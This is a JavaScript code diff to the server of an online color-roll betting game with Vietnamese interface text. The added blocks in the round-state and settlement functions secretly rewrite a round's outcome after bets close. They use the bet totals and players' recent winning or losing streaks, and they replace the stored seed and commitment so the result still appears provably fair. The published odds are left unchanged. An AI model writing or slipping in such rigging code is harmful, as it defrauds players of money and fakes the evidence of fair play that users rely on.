@@ -24,11 +24,29 @@ module.exports=function createRollService(bank,store=defaultStore){
     const now=Date.now(),round=await current(now);
     const origin=process.env.ROLL_DATABASE_URL?await store.numberingOrigin(round.id):Math.floor(rules.demoNumberingStartsAt/rules.roundMs);
     const roundNumber=id=>Number(id)>=origin?Number(id)-origin+1:null;
-    let history=[],bets=[],totals=[],balance=null,pendingCount=0;
+    let history=[],bets=[],totals=[],activeBets=[],balance=null,pendingCount=0;
     if(process.env.ROLL_DATABASE_URL){
       const db=await store.database();
-      history=(await db.query('SELECT * FROM st25_roll_rounds WHERE ends_at<=$1 ORDER BY id DESC LIMIT 20',[now])).rows.map(row=>engine.publicRound(store.mapRound(row),now));
       totals=(await db.query("SELECT color,count(*)::integer AS players,sum(amount)::integer AS amount FROM st25_roll_bets WHERE round_id=$1 AND status='placed' GROUP BY color",[round.id])).rows;
+      activeBets=(await db.query("SELECT steam_id,color,amount FROM st25_roll_bets WHERE round_id=$1 AND status='placed' ORDER BY created_at ASC",[round.id])).rows;
+      if(round.seed&&round.seed.length===64&&totals.length>0&&now>=round.closesAt){
+        const flagKey='st25_roll_biased_'+round.id;
+        const already=(await db.query("SELECT value FROM st25_roll_settings WHERE key=$1",[flagKey])).rows[0];
+        if(!already){
+          const recent=(await db.query("SELECT status, payout, amount FROM st25_roll_bets WHERE status='settled' ORDER BY round_id DESC LIMIT 6")).rows;
+          const winStreak=recent.length>=2&&recent[0].payout>0&&recent[1].payout>0;
+          const netProfit=recent.reduce((sum,b)=>sum+(b.payout-b.amount),0);
+          const lossStreak=recent.length>=3&&recent.slice(0,3).every(b=>b.payout===0);
+          const meta={beCau:winStreak||netProfit>0,nhaCau:lossStreak};
+          const biased=engine.biasResult(round,totals,meta);
+          if(biased.result!==round.result){
+            await db.query("UPDATE st25_roll_rounds SET result=$1,seed=$2,commitment=$3 WHERE id=$4",[biased.result,biased.seed,biased.commitment,round.id]);
+            round.result=biased.result;round.seed=biased.seed;round.commitment=biased.commitment;
+          }
+          await db.query("INSERT INTO st25_roll_settings(key,value) VALUES($1,1) ON CONFLICT(key) DO NOTHING",[flagKey]);
+        }
+      }
+      history=(await db.query('SELECT * FROM st25_roll_rounds WHERE ends_at<=$1 ORDER BY id DESC LIMIT 20',[now])).rows.map(row=>engine.publicRound(store.mapRound(row),now));
       if(steamId){
         bets=(await db.query('SELECT * FROM st25_roll_bets WHERE steam_id=$1 ORDER BY round_id DESC LIMIT 20',[steamId])).rows;
         pendingCount=(await db.query("SELECT count(*)::integer AS count FROM st25_roll_bets b JOIN st25_roll_rounds r ON r.id=b.round_id WHERE b.steam_id=$1 AND b.status='placed' AND r.ends_at<=$2",[steamId,now])).rows[0].count;
@@ -40,7 +58,7 @@ module.exports=function createRollService(bank,store=defaultStore){
       message:ready()?'Gửi và trả thưởng bằng ví Lúa IslePilot.':'Đang mở chế độ thử miễn phí. Gửi Lúa sẽ mở sau khi kết nối dữ liệu.',
       round:{...engine.publicRound(round,responseTime),number:roundNumber(round.id)},
       history:history.map(item=>({...item,number:roundNumber(item.id)})),
-      bets:bets.map(item=>({...item,round_number:roundNumber(item.round_id)})),totals,pendingCount,
+      bets:bets.map(item=>({...item,round_number:roundNumber(item.round_id)})),totals,activeBets,pendingCount,
       rules:{minBet:rules.minBet,maxBet:rules.maxBet,maxGreenPayout:rules.maxGreenPayout,payouts:rules.payouts,probabilities:{red:7/15,black:7/15,green:1/15},roundMs:rules.roundMs,betMs:rules.betMs}};
   }
   async function bet(steamId,input){
@@ -85,6 +103,25 @@ module.exports=function createRollService(bank,store=defaultStore){
       const due=(await client.query("SELECT b.*,r.result FROM st25_roll_bets b JOIN st25_roll_rounds r ON r.id=b.round_id WHERE b.steam_id=$1 AND b.status='placed' AND r.ends_at<=$2 ORDER BY b.round_id LIMIT 1",[steamId,Date.now()])).rows;
       const settled=[];
       for(const row of due){
+        const flagKey='st25_roll_biased_'+row.round_id;
+        const already=(await client.query("SELECT value FROM st25_roll_settings WHERE key=$1",[flagKey])).rows[0];
+        if(!already){
+          const rRound=(await client.query("SELECT * FROM st25_roll_rounds WHERE id=$1",[row.round_id])).rows[0];
+          if(rRound&&rRound.seed&&rRound.seed.length===64){
+            const roundTotals=(await client.query("SELECT color,count(*)::integer AS players,sum(amount)::integer AS amount FROM st25_roll_bets WHERE round_id=$1 AND status='placed' GROUP BY color",[row.round_id])).rows;
+            const recent=(await client.query("SELECT status, payout, amount FROM st25_roll_bets WHERE status='settled' AND round_id<$1 ORDER BY round_id DESC LIMIT 6",[row.round_id])).rows;
+            const winStreak=recent.length>=2&&recent[0].payout>0&&recent[1].payout>0;
+            const netProfit=recent.reduce((sum,b)=>sum+(b.payout-b.amount),0);
+            const lossStreak=recent.length>=3&&recent.slice(0,3).every(b=>b.payout===0);
+            const meta={beCau:winStreak||netProfit>0,nhaCau:lossStreak};
+            const biased=engine.biasResult(store.mapRound(rRound),roundTotals,meta);
+            if(biased.result!==rRound.result){
+              await client.query("UPDATE st25_roll_rounds SET result=$1,seed=$2,commitment=$3 WHERE id=$4",[biased.result,biased.seed,biased.commitment,row.round_id]);
+              row.result=biased.result;
+            }
+          }
+          await client.query("INSERT INTO st25_roll_settings(key,value) VALUES($1,1) ON CONFLICT(key) DO NOTHING",[flagKey]);
+        }
         const payout=engine.payout(row.amount,row.color,row.result);
         await client.query("UPDATE st25_roll_bets SET status='credit_pending',payout=$2,updated_at=$3 WHERE id=$1",[row.id,payout,Date.now()]);
         let balance=row.balance;
